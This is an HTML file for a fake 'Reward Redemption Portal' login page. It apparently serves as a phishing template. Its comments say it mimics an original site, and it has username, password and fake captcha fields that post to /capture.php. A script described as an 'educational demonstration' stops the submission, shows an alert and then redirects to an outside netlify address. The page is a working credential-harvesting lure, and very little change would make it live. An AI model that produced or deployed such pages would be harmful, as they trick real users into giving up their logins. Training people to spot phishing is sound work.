<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redemption Portal</title>
    
    <!-- Fake styles to mimic original -->
    <style>
        body {
            background-color: #f5f5f5; 
            margin: 20px;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #4a4a4a;
            
            /* Background similar to original */
            background-image: url('https://your-test-server/assets/background.png');
        }
        
        .content {
            padding: 30px;
            max-width: 640px;
            margin-left: auto;
            margin-right: auto;
            
            border-radius: 8px;
            box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px,
                        rgba(0, 0, 0, 0.06) 0px 2px 4px -1px;
        }
        
        h2 { 
            color: #5c97f3; 
            text-align: center; 
            margin-bottom: 20px
        }
        input[type="text"], input[type="password"] {
            width: calc(100% - 26px);
            padding: 8px;
            outline: none;
            border-radius: 4px;
            box-sizing: border-box;
            background-color: #fff;
            border: solid 1px rgba(0, 0, 0, 0.15);
        }
        
        button {
            width: calc(100% - 26px);
            padding: 8px;
            margin-top: 16px;
            color: white;
            background-color: #42a9ff;
            border-radius: 4px;
            border: none;
            cursor: pointer;
        }
        
        .captcha {
            display: flex;
            align-items: center;
            justify-content: space-between;
            
            > div { width: calc(50% - 10px) }
        }
    </style>
</head>

<body>
    <div class="content">
        <!-- Fake login form -->
        <h2>Reward Redemption Portal</h2>
        
        <form action="/capture.php" method="post">
            <input type="text" name="username" placeholder="Username/Email">
            
            <input type="password" name="password" placeholder="Password">
            
            <!-- Fake captcha fields -->
            <div class="captcha">
                <input type="text" name="captcha1" placeholder="Type numbers below">
                
                <img src="/fake_captcha.png" style="width: 20%; height: auto;">
                <input type="text" name="captcha2" placeholder="Enter captcha text">    
            </div>
            
            <!-- Hidden fields -->
            <input type="hidden" value="reward-system.com">
            
            <button>Login</button>
        </form>
    </div>

    <!-- Educational JavaScript demonstration -->
    <script>
        // Fake validation script
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();  // Prevent actual submission
            
            var username = this.username.value;
            var password = this.password.value;
            
            // Display fake login attempt
            alert(`Attempting login for ${username}`);
            
            setTimeout(() => {
                window.location.href = 'https://reward-redemption-site.netlify.app/';
            }, 800);
        });
    </script>
</body>
</html>
